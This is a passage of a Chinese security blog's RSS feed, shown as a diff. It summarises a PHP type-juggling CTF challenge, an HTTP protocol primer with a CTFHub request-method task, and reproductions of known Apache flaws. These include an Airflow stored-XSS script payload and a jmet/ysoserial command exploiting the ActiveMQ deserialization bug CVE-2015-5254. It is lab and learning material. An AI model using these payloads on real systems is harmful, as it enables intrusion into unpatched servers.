+&amp;lt;?php show_source(__FILE__); include(&amp;#34;config.php&amp;#34;); $a = @$_GET[&amp;#39;a&amp;#39;]; $b = @$_GET[&amp;#39;b&amp;#39;]; if ($a == 0 and $a) { echo $flag1; } if (is_numeric($b)) { exit(); } if ($b &amp;gt; 1234) { echo $flag2; } ?</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://oopsdc.com/post/http%E5%8D%8F%E8%AE%AE/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://oopsdc.com/post/http%E5%8D%8F%E8%AE%AE/</guid>
+      <description>HTTP协议简介 HTTP，即Hyper Text Transfer Protocol超文本传输协议。是用于万维网WWW (World Wide Web)服务器传输超文本到本地浏览器的传输协议，其基于TCP/IP通信协议传输数据。但由于HTTP以明文方式传输数据，缺乏安全性，后面又诞生了HTTPS，即HyperText Transfer Protocol Secure超文本传输安全协议，HTTPS也经由HTTP进行通信，但利用SSL/TLS加密数据包，提供对网站服务器的认证，保护交换资料的隐私和完整性。
+使用HTTP协议的网站URL为http://开头，默认端口号为80；使用HTTPS协议的网站URL为https://开头，默认端口号为443。
+接下来稍微对这两个协议进行一下拓展。
+HTTP工作原理 HTTP工作于C/S，即客户端/服务端架构上，浏览器作为HTTP客户端，通过URL向HTTP服务端，即Web服务器发送请求，常见Web服务器有Apache、IIS等，Web服务器依据收到的请求向客户端发送对应的响应信息。
+HTTP有以下三个特点：
+无连接：限制每次连接只处理一个请求，服务端处理完客户端的请求并收到客户端的应答后就会断开连接，其优势在于节省传输时间； 媒体独立：只要客户端和服务端知道如何处理数据内容，任何类型的数据都可通过HTTP进行传输，客户端和服务端只需协商好MIME-type即可； 无状态：HTTP协议对事务处理没有记忆能力，缺少状态意味着若后续还想继续处理之前的信息将必须对所有数据进行重传，这样做可能导致每次连接传输的数据量增大。 HTTP协议通信流程如下：
+请求方式 Des: HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。
+页面内容如下：
+HTTP Method is GET Use CTF**B Method, I will give you flag. Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php. 请求包如下：
+GET /index.php HTTP/1.1 Host: challenge-ce480bbff14843e2.sandbox.ctfhub.com:10800 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 按照给出的方式，使用bp抓包并对网站发送请求：</description>
+    </item>
+    
+    <item>
+      <title>Apache漏洞复现</title>
+      <link>https://oopsdc.com/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://oopsdc.com/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本的airflow webserver服务存在XSS漏洞，原因在于`WEB应用未对客户端数据进行正确验证，导致攻击者可利用该漏洞执行客户端代码。
+影响版本 Apache Airflow 1.10.3以下版本。
+漏洞复现 访问/admin/dagrun/(默认不需要密码)。
+创建一个项目，输入ID后点击保存，返回列表，点击running字样，发现能够输入HTML代码，例：
+&amp;lt;script&amp;gt;_a=&amp;#34;https://www.baidu.com&amp;#34;&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;document.location=_a&amp;lt;/script&amp;gt; 能直接造成存储型XSS。
+ActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，漏洞源于程序没有限制可在代理中序列化的类，攻击者通过借助特制序列化Java消息服务(JMS) ObjectMessage对象实现任意代码执行。
+影响版本 Apache ActiveMQ 5.13.0之前的5.x版本。
+复现思路 1.构造（可使用ysoserial）可执行命令的序列化对象。
+2.作为一个消息，发送给目标对应端口。
+3.访问Web管理页面，读取消息，触发漏洞。
+漏洞复现 使用jmet进行漏洞利用：ianxtianxt/jmet: Java Message Exploitation Tool (github.com)
+下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。
+jmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。
+给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件：
+java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &amp;#34;touch /tmp/vuln&amp;#34; -Yp ROME &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:&amp;lt;server-id&amp;gt; INFO d.</description>
+    </item>
+    
+  </channel>
+</rss>
